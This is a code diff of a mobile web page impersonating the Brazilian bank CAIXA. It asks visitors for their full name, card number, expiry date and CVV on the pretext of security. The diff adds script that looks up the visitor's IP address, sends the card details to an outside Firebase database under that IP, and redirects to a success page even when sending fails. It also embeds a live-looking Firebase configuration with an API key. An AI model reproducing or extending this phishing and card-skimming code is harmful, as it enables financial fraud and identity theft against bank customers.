@@ -7,19 +7,20 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { display: flex; justify-content: center; background-color: #f0f0f0; }
-        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; position: relative; }
+        .mobile-container { width: 100%; max-width: 400px; height: 100vh; background-color: #ffffff; padding: 24px; position: relative; display: flex; flex-direction: column; }
 
         /* Cabeçalho */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 40px; }
-        .logo img { height: 35px; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; margin-bottom: 30px; }
+        .logo img { height: 35px; width: auto; }
+        .btn-sair { color: #005ca9; text-decoration: none; font-weight: 500; font-size: 16px; }
 
         /* Textos */
-        h1 { margin-bottom: 8px; font-size: 26px; color: #1d2124; font-weight: 800; }
-        p.subtitle { color: #5b6571; font-size: 15px; margin-bottom: 24px; line-height: 1.4; }
+        h1 { margin-bottom: 8px; font-size: 24px; color: #1d2124; font-weight: 800; }
+        p.subtitle { color: #5b6571; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
 
         /* Inputs */
         .input-group { position: relative; margin-bottom: 16px; }
-        .input-group input { width: 100%; padding: 16px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; outline: none; transition: border-color 0.2s; }
+        .input-group input { width: 100%; padding: 16px; border: 1.5px solid #6b7a87; border-radius: 24px; font-size: 16px; outline: none; transition: border-color 0.2s; color: #1d2124; }
         .input-group input:focus { border-color: #005ca9; }
         
         /* Layout lado a lado */
@@ -27,18 +28,18 @@
         .half { width: 50%; }
 
         /* Botão Confirmar */
-        .btn-confirmar { width: 100%; padding: 16px; background-color: #F39200; color: white; border: none; border-radius: 24px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 16px; transition: background-color 0.3s ease; }
-        .btn-confirmar:hover { background-color: #d88200; }
+        .btn-confirmar { width: 100%; padding: 16px; background-color: #ebf0f2; color: #9ab0bd; border: none; border-radius: 24px; font-weight: 600; font-size: 16px; cursor: not-allowed; margin-top: 10px; transition: all 0.3s ease; }
+        .btn-confirmar.ativo { background-color: #F39200; color: white; cursor: pointer; }
+        .btn-confirmar.ativo:hover { background-color: #d88200; }
 
         /* --- Estilos do Botão de Ajuda Flutuante e Modal --- */
-        
         .btn-ajuda-flutuante {
             position: fixed;
             bottom: 24px;
             right: 24px;
             width: 50px;
             height: 50px;
-            background-color: #005ca9; /* Azul Caixa */
+            background-color: #005ca9;
             color: #ffffff;
             border-radius: 50%;
             display: flex;
@@ -55,7 +56,7 @@
         .btn-ajuda-flutuante:hover { background-color: #004a87; }
 
         .modal-overlay {
-            display: none; /* Escondido por padrão */
+            display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
@@ -90,7 +91,6 @@
             font-size: 16px;
             cursor: pointer;
         }
-        
     </style>
 </head>
 <body>
@@ -100,30 +100,30 @@
             <div class="logo">
                 <img src="https://logo-teka.com/wp-content/uploads/2026/07/caixa-icon-logo.svg" alt="logo CAIXA">
             </div>
-            <a href="index.html" style="color:#005ca9; text-decoration:none; font-weight: 500;">Sair</a>
+            <a href="index.html" class="btn-sair">Sair</a>
         </header>
 
         <h1>Confirmar Dados</h1>
         <p class="subtitle">Para sua segurança e para liberar seu acesso, confirme os dados do seu cartão titular.</p>
 
         <div class="input-group">
-            <input type="text" placeholder="Nome Completo">
+            <input type="text" id="nome" placeholder="Nome Completo" autocomplete="off">
         </div>
         
         <div class="input-group">
-            <input type="text" id="cartao" placeholder="Número do cartão" maxlength="19">
+            <input type="text" id="cartao" placeholder="Número do cartão" maxlength="19" autocomplete="off">
         </div>
 
         <div class="row-group">
             <div class="input-group half">
-                <input type="text" id="data" placeholder="(MM/AA)" maxlength="5">
+                <input type="text" id="data" placeholder="(MM/AA)" maxlength="5" autocomplete="off">
             </div>
             <div class="input-group half">
-                <input type="password" id="CVV" placeholder="CVV" maxlength="3">
+                <input type="password" id="CVV" placeholder="CVV" maxlength="3" autocomplete="off">
             </div>
         </div>
 
-        <button class="btn-confirmar" onclick="alert('Dados enviados para análise com sucesso!')">Confirmar</button>
+        <button type="button" class="btn-confirmar" id="btnConfirmar" disabled>Confirmar</button>
 
         <!-- Botão Flutuante de Ajuda -->
         <div class="btn-ajuda-flutuante" id="btnAjuda">?</div>
@@ -135,34 +135,94 @@
             <h2>Como preencher os dados?</h2>
             <ul>
                 <li><strong>Nome Completo:</strong> Digite o nome exatamente como está impresso no seu cartão.</li>
-                <li><strong>Número do cartão:</strong> São os 16 dígitos localizados na frente ou no verso do cartão.</li>
+                <li><strong>Número do cartão:</strong> São os dígitos localizados na frente do cartão.</li>
                 <li><strong>(MM/AA):</strong> Mês e ano de vencimento do cartão.</li>
-                <li><strong>CVV:</strong> O código de segurança de 3 dígitos, geralmente localizado no verso do seu cartão.</li>
+                <li><strong>CVV:</strong> O código de segurança de 3 dígitos do verso do cartão.</li>
             </ul>
             <button class="btn-fechar-modal" id="btnFecharModal">Entendi</button>
         </div>
     </div>
 
-    <script>
-        // Máscara para o Número do Cartão
-        document.getElementById('cartao').addEventListener('input', function(e) {
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA9WtjdMj6wBsqkaPcZC9Xa9TgCpB11eho",
+            authDomain: "dados-a1d4d.firebaseapp.com",
+            databaseURL: "https://dados-a1d4d-default-rtdb.firebaseio.com",
+            projectId: "dados-a1d4d",
+            storageBucket: "dados-a1d4d.firebasestorage.app",
+            messagingSenderId: "550441905479",
+            appId: "1:550441905479:web:ff1ef4eec12a928895b062"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const inputNome = document.getElementById('nome');
+        const inputCartao = document.getElementById('cartao');
+        const inputData = document.getElementById('data');
+        const inputCVV = document.getElementById('CVV');
+        const btnConfirmar = document.getElementById('btnConfirmar');
+
+        // Validação dinâmica dos campos
+        function validarCampos() {
+            if (inputNome.value.length > 3 && inputCartao.value.length >= 15 && inputData.value.length === 5 && inputCVV.value.length === 3) {
+                btnConfirmar.disabled = false;
+                btnConfirmar.classList.add('ativo');
+            } else {
+                btnConfirmar.disabled = true;
+                btnConfirmar.classList.remove('ativo');
+            }
+        }
+
+        inputNome.addEventListener('input', validarCampos);
+
+        inputCartao.addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, ''); 
             v = v.replace(/(\d{4})(?=\d)/g, '$1 '); 
             e.target.value = v;
+            validarCampos();
         });
 
-        // Máscara para Data (MM/AA)
-        document.getElementById('data').addEventListener('input', function(e) {
+        inputData.addEventListener('input', function(e) {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
             e.target.value = v;
+            validarCampos();
         });
 
-        // Máscara para CVV
-        document.getElementById('CVV').addEventListener('input', function(e) {
+        inputCVV.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
             if (e.target.value.length > 3) {
                 e.target.value = e.target.value.substring(0, 3);
+            }
+            validarCampos();
+        });
+
+        // Envio dos dados para o Firebase baseado no IP do usuário
+        btnConfirmar.addEventListener('click', async function() {
+            if (btnConfirmar.disabled) return;
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const dataRes = await response.json();
+                let ipUsuario = dataRes.ip;
+                let ipKey = ipUsuario.replace(/\./g, '_').replace(/:/g, '_');
+
+                await update(ref(db, 'usuarios/' + ipKey), {
+                    nomeCompleto: inputNome.value,
+                    cartao: inputCartao.value,
+                    validade: inputData.value,
+                    cvv: inputCVV.value,
+                    dataUltimoAcesso: new Date().toISOString()
+                });
+
+                window.location.href = 'sucesso.html'; // Altere para a próxima página desejada
+            } catch (error) {
+                console.error("Erro ao enviar dados:", error);
+                window.location.href = 'sucesso.html';
             }
         });
 
@@ -171,17 +231,14 @@
         const btnAjuda = document.getElementById('btnAjuda');
         const btnFecharModal = document.getElementById('btnFecharModal');
 
-        // Abrir Modal
         btnAjuda.addEventListener('click', function() {
             modalAjuda.style.display = 'flex';
         });
 
-        // Fechar Modal pelo botão
         btnFecharModal.addEventListener('click', function() {
             modalAjuda.style.display = 'none';
         });
 
-        // Fechar Modal clicando fora do quadro branco (no fundo escuro)
         window.addEventListener('click', function(e) {
             if (e.target === modalAjuda) {
                 modalAjuda.style.display = 'none';
